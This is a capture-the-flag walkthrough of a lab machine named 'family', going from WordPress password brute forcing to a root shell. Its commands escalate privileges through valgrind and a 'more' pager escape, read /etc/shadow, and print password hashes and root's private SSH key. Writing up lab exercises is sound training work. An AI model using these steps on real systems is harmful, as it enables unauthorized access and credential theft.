After finishing the machine, the main part of this machine is the privialge escilation.

root@kali ~# nmap -sS -A -T4 -p- 10.0.0.8

PORT   STATE SERVICE VERSION                                                                              
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                       
| ssh-hostkey:                                                                                            
|   2048 0d:4e:fd:57:05:8f:d0:d6:1d:67:5d:6d:4e:b5:c9:fc (RSA)                                            
|   256 d4:98:fb:a7:94:bd:0c:c6:a8:60:5b:bc:b9:c7:f4:51 (ECDSA)                                           
|_  256 fa:34:3a:25:74:40:99:fc:4f:60:be:db:7e:7f:93:be (ED25519)                                         
80/tcp open  http    Apache httpd 2.4.38                                                                  
|_http-title: Index of /                                                                                  
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2020-02-06 07:33  wordpress/
|_
|_http-server-header: Apache/2.4.38 (Debian)

Firing up NMAP we see 2 open ports, 22 and 80. We can see that HTTP has a wordpress folder.

root@kali ~# wpscan -e u --url http://10.0.0.8/wordpress

The scan found a username: admin, we can now user "Wpscan" to brute force the login using our username. 

root@kali ~# wpscan -U 'admin' -P /usr/share/wordlists/rockyou.txt --url http://10.0.0.8/wordpress

And we found the password!

Username: admin, Password: phantom

After login in we can upload a php reverse shell and connect to the machine.
Going to the "home" folder we see 3 users.

baby
father
mother

I tried to find SUID files to exploit but found nothing. I uploaded a tool named "pspy64" to see running proccess and try to see if there any cron tabs.

2022/01/26 18:49:01 CMD: UID=0    PID=1002   | /usr/sbin/CRON -f 
2022/01/26 18:49:01 CMD: UID=0    PID=1003   | /usr/sbin/CRON -f 
2022/01/26 18:49:01 CMD: UID=1001 PID=1004   | /bin/sh -c python ~/check.py

There was one proccess that was running every minute. "check.py" is running by the "mother" use every minute, we currently don't have access to go to mother directory as the www-data, let's try getting a higher level user.

I searched for files owened by the user "baby" or "father" and found this file.

/usr/share/perl/5.28.1/perso.txt ---> uncrackablepassword

We found the password for the user "father". After loggin in we can now see what is inside the directory "father", unfortanatly there was no useful information found, but we do have access to the directory "mother" where the "check.py" script that is running by crontab should be at. Doesn't seem there like there is any script there, so we can make one of our own. I found this tool on github named rsg (Reverse Shell Generator) that generated a python reverse shell we could upload to the remote machine. I made a file named check.py and added the script to it, and after one minute we got a shell as the user "mother"

$ sudo -l

User mother may run the following commands on family:
    (baby) NOPASSWD: /usr/bin/valgrind

We can run the command /usr/bin/valgrind as root without a password only as the "baby" user. The "valgrind" command is a debugging and profiling tool, we can open a new shell with the command like so "/usr/bin/valgrind /bin/bash". 

$ sudo -u baby /usr/bin/valgrind /bin/bash
whoami
baby
python3 -c 'import pty; pty.spawn("/bin/bash")'
baby@family:/home/mother$ 

Going to the "baby" directory there is a user.txt file.

user.txt:
Chilatyfile

Now we need to find the root flag.

baby@family:~$ sudo -l

User baby may run the following commands on family:
    (ALL : ALL) NOPASSWD: /usr/bin/cat
baby@family:~$ 

We can only use the cat command as root, this means we can read files with root permissions like the /etc/shadow file.

baby:$6$rlIgk/Phk.yVFB7M$6HwyFb1Zdc.1U4AsleVCMMuBjAul2.E8iEnow7PS0YMPCj/1.bAOcrqOWcB.Rr8TenvucGd/uhcXQKpRJfgLR1:18742:0:99999:7:::


root:$6$L9G0N6PxOApm2r4H$USfkGDLggFm.5W9nF5V54J0Zi5hXCcMofITfEXf7QyxIUWnNX2l1bpxpXIYo20JY5968YsklB9k8x1e6RuND/0:18742:0:99999:7:::

I tried to use john to crack the password but it didn't work. What we can do is read file on the root directory.

baby@family:~$ sudo cat /root/.ssh
cat: /root/.ssh: Is a directory

We see we have a ssh directory on the root direcotry.

baby@family:~$ sudo cat /root/.ssh/authorized_keys
command="bash ~/troll.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdu5YWqC4vVGDE8XaQ7UW/WkLgEgWPE6n4BNfeTha+4nIR2twAUHl6yfz0HpNMqMF996Yj8+lvr8pD5FeOCHlm0TPGZEeE72/04Bxebvoz/TCYbj2/6cPv3LndsoUyNyyrC8dleOfhvdaTWbJBMLaw/vrdQ18F93lkf25WIGpPc1lA2ubNXxXnfh9mwZ4ewx++91tTnJFaVAgfKm6sqzmMq3BedEmqlOcOSJyzZIFypov7WK/BkjI2UG91LthkGjFFqwsbndQqDhIhz0re6N1i0INhhIaNHEdAsgNHHXAYOjgGfeMFtmwepPoDeanHfruPHTxYeVzL55uEbK5e2cGv root@family

baby@family:~$ sudo cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAnbuWFqguL1RgxPF2kO1Fv1pC4BIFjxOp+ATX3k4WvuJyEdrcAFB5
esn89B6TTKjBffemI/Ppb6/KQ+RXjgh5ZtEzxmRHhO9v9OAcXm76M/0wmG49v+nD79y53b
KFMjcsqwvHZXjn4b3Wk1myQTC2sP763UNfBfd5ZH9uViBqT3NZQNrmzV8V534fZsGeHsMf
vvdbU5yRWlQIHypurKs5jKtwXnRJqpTnDkics2SBcqaL+1ivwZIyNlBvdS7YZBoxRasLG5
3UKg4SIc9K3ujdYtCDYYSGjRxHQLIDRx1wGDo4Bn3jBbZsHqT6A3mpx367jx08WHlcy+eb
hGyuXtnBrwAAA8CBizlZgYs5WQAAAAdzc2gtcnNhAAABAQCdu5YWqC4vVGDE8XaQ7UW/Wk
LgEgWPE6n4BNfeTha+4nIR2twAUHl6yfz0HpNMqMF996Yj8+lvr8pD5FeOCHlm0TPGZEeE
72/04Bxebvoz/TCYbj2/6cPv3LndsoUyNyyrC8dleOfhvdaTWbJBMLaw/vrdQ18F93lkf2
5WIGpPc1lA2ubNXxXnfh9mwZ4ewx++91tTnJFaVAgfKm6sqzmMq3BedEmqlOcOSJyzZIFy
pov7WK/BkjI2UG91LthkGjFFqwsbndQqDhIhz0re6N1i0INhhIaNHEdAsgNHHXAYOjgGfe
MFtmwepPoDeanHfruPHTxYeVzL55uEbK5e2cGvAAAAAwEAAQAAAQBKCYUXuXWETczmZJjM
yjLU8N83If5t/ELp4gwZkvnmO5BjhSGDHEMJOcp8I+XsM8IvCJF5isHl5NPCLmpShvPFKS
luVB+l7GXWwWNPiDP1N0EaK5TcgjOwYSD1SRhwS6mx1+OOY8QkF+GiZJXhN6ZpSiYiub7e
pBzc6Vu3HZwJElUCvAuCxDbazc+RUT9VzH2BdQ3w1D66T8c3ruuRD8P86s0zf7/Bo/OmBi
YeT/X3QcjyZTgmPjBR/m7nZNVUaDgWMCzIx2OecXX2bhdIVnpgVZVSq+EpidgvOPa/bjfQ
AXB5vEuQ7lGz15Hx2isz5ai/zAKIGY33omnDT3f4ESvRAAAAgCkSIIvDtArb/6jXQb57In
aExbm6PurE05TEHj/COnGSjD0iWk6CFFs33ud1A4FX1ACEVkEh51KBukSGhOXHd/nAH56i
pL4h5vmyt3JqLlilSkRju2oOH1I5edxIbTHD5aFHssD3l2OSaO4ax/h42BVp+Xr63FdDbS
NV8qd9gYp7AAAAgQDM02e+O6t1J+X41VaGRuJTnYCfWXKA5KnmmDM5UKQHm4i0dXL9xWgE
bBrFggoE2XsowMLRGOPe0ijuXOkgkpCeSB/rxmQ+Nn2x2O/H7yoIgl1IbpNIK6EZTaCebC
lfdn0hK55BSl394ql0y4ns91E4XL0Xvc9RDlBvGF5BAd/KwwAAAIEAxSQf51F5oIYIvl4l
9y3g77L+VlV0Yg9iLunUT/km9abp9e2oTsNXN3e9IHja5GVxOUjhlBC8Yposlv/oaAApJu
KC9XLqjqEmpo5gq61fG0HRPOkt1DKNuR3zIrWHot0DificHPyGISeu1/oR8tr9OR6Hmlvh
+AY4rKYqqUj+hqUAAAALcm9vdEBmYW1pbHk=
-----END OPENSSH PRIVATE KEY-----

We can read the "authorized_keys" file and the private key, let's try to log in via ssh.

root@kali ~/D/C/Family# ssh root@10.0.0.8 -i key.txt


                          oooo$$$$$$$$$$$$oooo
                      oo$$$$$$$$$$$$$$$$$$$$$$$$o
                   oo$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o         o$   $$ o$
   o $ oo        o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o       $$ $$ $$o$
oo $ $ "$      o$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$$o       $$$o$$o$
"$$$$$$o$     o$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$o    $$$$$$$$
  $$$$$$$    $$$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$$$$$$$$$$$$$$
  $$$$$$$$$$$$$$$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$$$$$$$  """$$$
   "$$$""""$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     "$$$
    $$$   o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     "$$$o
   o$$"   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$       $$$o
   $$$    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" "$$$$$$ooooo$$$$o
  o$$$oooo$$$$$  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$   o$$$$$$$$$$$$$$$$$
  $$$$$$$$"$$$$   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     $$$$""""""""
 """"       $$$$    "$$$$$$$$$$$$$$$$$$$$$$$$$$$$"      o$$$
            "$$$o     """$$$$$$$$$$$$$$$$$$"$$"         $$$
              $$$o          "$$""$$$$$$""""           o$$$
               $$$$o                 oo             o$$$"
                "$$$$o      o$$$$$$o"$$$$o        o$$$$
                  "$$$$$oo     ""$$$$o$$$$$o   o$$$$""  
                     ""$$$$$oooo  "$$$o$$$$$$$$$"""
                        ""$$$$$$$oo $$$$$$$$$$       
                                """"$$$$$$$$$$$        
                                    $$$$$$$$$$$$       
                                     $$$$$$$$$$"      
                                      "$$$""""
                                                                                                          
                                                                                                          
                                                                                                          
                                                                                                          
                                                                                                          
                                                                                                          
Connection to 10.0.0.8 closed. 

Reading the "authorized_keys" file again we see that a the command "troll.sh" is being executed once checking the hosts.

baby@family:~$ sudo cat /root/troll.sh
#!/bin/sh
export TERM=xterm
more /root/welcome.txt
exit 0

Reading the "troll.sh" command we see the it reads a txt file using the "more" command and the exits.

The "more" command is different from "cat" by displaying one screen at a time in case the file is large. The "more" command also allows the user do scroll up and down through the page and execute commands.
That means if we can make the more command think the file it is trying to read is too large we can execute a command.
All we need to is resize the window so the file won't be able to be displayed on the screen.

                          oooo$$$$$$$$$$$$oooo
                      oo$$$$$$$$$$$$$$$$$$$$$$$$o
                   oo$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o         o$   $$ o$
   o $ oo        o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$o       $$ $$ $$o$
oo $ $ "$      o$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$$o       $$$o$$o$
"$$$$$$o$     o$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$o    $$$$$$$$
  $$$$$$$    $$$$$$$$$$$      $$$$$$$$$$$      $$$$$$$$$$$$$$$$$$$$$$$
  $$$$$$$$$$$$$$$$$$$$$$$    $$$$$$$$$$$$$    $$$$$$$$$$$$$$  """$$$
   "$$$""""$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     "$$$
    $$$   o$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     "$$$o
   o$$"   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$       $$$o
   $$$    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" "$$$$$$ooooo$$$$o
  o$$$oooo$$$$$  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$   o$$$$$$$$$$$$$$$$$
  $$$$$$$$"$$$$   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$     $$$$""""""""
 """"       $$$$    "$$$$$$$$$$$$$$$$$$$$$$$$$$$$"      o$$$
--More--(62%)
!/bin/bash
root@family:~# 

We can now read the final flag.

last_flag.txt:                                                 
Selmorbormir 